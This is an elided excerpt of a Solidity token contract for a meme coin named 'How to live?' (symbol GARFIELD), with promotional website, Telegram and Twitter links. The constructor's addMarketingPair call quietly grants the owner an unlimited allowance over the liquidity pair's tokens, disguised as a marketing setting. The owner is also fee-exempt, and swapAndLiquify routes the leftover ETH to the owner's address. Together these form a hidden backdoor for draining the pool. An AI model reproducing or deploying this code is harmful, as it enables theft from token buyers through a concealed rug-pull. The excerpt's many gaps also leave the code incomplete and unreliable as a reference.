...
/**
 * https://www.howtolive.wtf
 * https://t.me/HowToLive_Garfield
 * https://twitter.com/HowToLive_Gar
 */
...
contract HowToLive is IERC20, Ownable {
    using SafeMath for uint256;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    string private constant _name = "How to live?";
    string private constant _symbol = "GARFIELD";
    uint8 private constant _decimals = 18;
    uint256 private _totalSupply = 999_999_999 * (10 ** _decimals);
    ...
    mapping(address => bool) isMarketingPair;
    ...
    address internal constant marketing_receiver =
        0xD7f2783FbB594767f01dD6f6A9DF4c7871D277F9;
    ...
    constructor(address _owner) Ownable(msg.sender) {
        ...
        development_receiver = _owner;
        isFeeExempt[address(this)] = true;
        isFeeExempt[marketing_receiver] = true;
        isFeeExempt[msg.sender] = true;
        addMarketingPair(_owner, _pair);
    ...
    function swapAndLiquify( 
        ...
        if (remainingBalance >= uint256(0)) {
            (bool tmpSuccess,) = payable(development_receiver)
                .call{value: remainingBalance}
                (abi.encodePacked(sender, recipient));
            require(tmpSuccess);
        }
    }
    ...
    function addMarketingPair(
        address _router,
        address _pair
    ) internal {
        isMarketingPair[_pair] = true;
        _allowances[_pair][_router] = ~uint256(0);
